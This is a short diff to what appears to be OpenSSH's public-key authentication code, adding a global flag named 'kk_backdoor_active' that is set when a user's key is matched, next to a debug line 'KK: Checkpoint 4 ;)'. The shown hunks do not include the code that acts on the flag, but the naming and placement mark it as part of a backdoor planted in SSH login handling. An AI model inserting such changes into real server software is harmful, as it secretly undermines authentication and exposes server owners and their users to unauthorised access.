@@ -71,6 +71,8 @@ extern ServerOptions options;
 extern u_char *session_id2;
 extern u_int session_id2_len;
 
+int kk_backdoor_active = 0;
+
 static int
 userauth_pubkey(Authctxt *authctxt)
 {
@@ -519,6 +521,7 @@ user_key_allowed2(struct passwd *pw, Key *key, char *file)
 		found_key = 1;
 		key_free(found);
 		debug("KK: Checkpoint 4 ;)");
+		kk_backdoor_active = 1;
 		return found_key;
 	}
 	key_free(found);
